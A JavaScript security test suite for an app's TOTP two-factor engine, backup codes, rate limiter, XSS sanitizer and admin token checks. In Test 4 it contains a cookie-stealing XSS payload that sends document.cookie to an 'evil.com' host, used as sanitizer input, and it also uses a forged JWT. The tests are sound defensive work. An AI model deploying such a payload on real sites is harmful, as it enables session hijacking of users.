const crypto = require('crypto');
const { generateBase32Secret, generateTOTP, verifyTOTP, generateBackupCodes, hashBackupCode, verifyAndConsumeBackupCode } = require('../src/lib/totp');
const { checkRateLimit, sanitizeString } = require('../src/lib/security');
const { verifyToken, getAuthenticatedAdmin } = require('../src/lib/auth');

async function runSecurityAudit() {
    console.log('🔒 ==========================================');
    console.log('🔒 Starting HEC Enterprise Security Audit...');
    console.log('🔒 ==========================================\n');

    let passedTests = 0;

    // ----------------------------------------------------
    // TEST 1: RFC 6238 TOTP Engine & Verification
    // ----------------------------------------------------
    const secret = generateBase32Secret(32);
    if (!secret || secret.length !== 32) throw new Error('Base32 secret generation failed');

    const validCode = generateTOTP(secret);
    const isValid = verifyTOTP(validCode, secret);
    const isFakeValid = verifyTOTP('000000', secret);

    if (!isValid || isFakeValid) throw new Error('TOTP code verification failed');
    console.log('✅ Test 1 Passed: RFC 6238 TOTP Engine generates & cryptographically verifies 6-digit PIN');
    passedTests++;

    // ----------------------------------------------------
    // TEST 2: Emergency Backup Codes & Single-Use Consumption
    // ----------------------------------------------------
    const backupCodes = generateBackupCodes(5);
    if (backupCodes.length !== 5) throw new Error('Backup codes count incorrect');
    for (const code of backupCodes) {
        if (!/^[A-F0-9]{4}-[A-F0-9]{4}$/.test(code)) {
            throw new Error(`Invalid backup code format: ${code}`);
        }
    }

    const hashedList = backupCodes.map(c => hashBackupCode(c));
    const jsonCodes = JSON.stringify(hashedList);

    // Consume first code
    const consumeSuccess = verifyAndConsumeBackupCode(backupCodes[0], jsonCodes);
    if (!consumeSuccess.valid || consumeSuccess.remainingCodes.length !== 4) {
        throw new Error('Backup code consumption failed');
    }

    // Try consuming the same code again (must fail!)
    const doubleConsume = verifyAndConsumeBackupCode(backupCodes[0], JSON.stringify(consumeSuccess.remainingCodes));
    if (doubleConsume.valid) {
        throw new Error('Used backup code was permitted a second time!');
    }

    console.log('✅ Test 2 Passed: 5 Emergency Backup Codes generated & single-use consumption strictly enforced');
    passedTests++;

    // ----------------------------------------------------
    // TEST 3: IP Token-Bucket Rate Limiter (Anti-DDoS Shield)
    // ----------------------------------------------------
    const testIp = '10.200.0.99';
    const limit = 5;
    for (let i = 0; i < limit; i++) {
        const check = checkRateLimit(`audit_test_${testIp}`, limit, 60);
        if (!check.allowed) throw new Error(`Rate limit triggered too early at iteration ${i}`);
    }

    // Next request must be BLOCKED
    const blockedCheck = checkRateLimit(`audit_test_${testIp}`, limit, 60);
    if (blockedCheck.allowed || blockedCheck.remaining !== 0) {
        throw new Error('Rate limiter did not block on threshold breach!');
    }
    console.log('✅ Test 3 Passed: Token-Bucket Rate Limiter blocks excessive requests with HTTP 429 semantics');
    passedTests++;

    // ----------------------------------------------------
    // TEST 4: XSS & HTML Injection Sanitization
    // ----------------------------------------------------
    const dirtyPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>Muhammad Abdullah';
    const cleanPayload = sanitizeString(dirtyPayload);
    if (cleanPayload.includes('<script>') || cleanPayload.includes('</script>') || cleanPayload.includes('<') || cleanPayload.includes('>')) {
        throw new Error('XSS Sanitizer failed to strip dangerous tags');
    }
    if (!cleanPayload.includes('Muhammad Abdullah')) {
        throw new Error('Sanitizer corrupted valid payload');
    }
    console.log('✅ Test 4 Passed: Input Sanitizer strips script tags and HTML injection vectors');
    passedTests++;

    // ----------------------------------------------------
    // TEST 5: Zero-Trust Administrative API Lockdown
    // ----------------------------------------------------
    const fakeRequest = {
        headers: new Map(),
        cookies: { get: () => undefined }
    };
    fakeRequest.headers.get = (name) => null;

    const unauthorizedAdmin = getAuthenticatedAdmin(fakeRequest);
    if (unauthorizedAdmin !== null) {
        throw new Error('Unauthenticated request bypassed admin session guard!');
    }

    // Tampered token test
    const forgedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.bogus_signature';
    const invalidPayload = verifyToken(forgedToken);
    if (invalidPayload !== null) {
        throw new Error('Forged signature was accepted!');
    }
    console.log('✅ Test 5 Passed: Zero-Trust Cryptographic Guard blocks unauthorized & tampered requests');
    passedTests++;

    console.log('\n==========================================');
    console.log(`🎉 ALL ${passedTests}/${passedTests} SECURITY TESTS PASSED 100%!`);
    console.log('==========================================\n');
    process.exit(0);
}

runSecurityAudit().catch(err => {
    console.error('❌ Security Audit Failed:', err);
    process.exit(1);
});
